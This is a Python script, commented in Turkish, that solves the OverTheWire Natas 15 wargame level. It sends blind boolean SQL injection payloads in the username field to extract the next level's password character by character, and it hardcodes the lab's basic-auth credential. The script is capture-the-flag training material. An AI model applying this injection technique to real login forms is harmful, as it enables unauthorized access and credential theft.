import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
filtered = ''
passwd = ''

for char in chars:
    Data = {'username' : 'natas16" AND password LIKE "%' + char + '%" #'} # request ile gönderilecek parametre
    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
    if 'exists' in r.text:  # eğer kullanıcı mevcutsa.
        filtered +=  char  ## kullanıcı mevcutsa karakteri ekler.
        print(filtered)

for i in range(0,32):  # password 32 haneli
    for char in filtered:  #bulunan karakterlerde dolaş. bruteforce saldırısını kolaylaştırır.
        Data = {'username' : 'natas16" AND password LIKE "' + passwd + char + '%" #'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
        if 'exists' in r.text : # şifrenin bir sonraki henesini bulur.
            passwd += char
            print(passwd)
            break
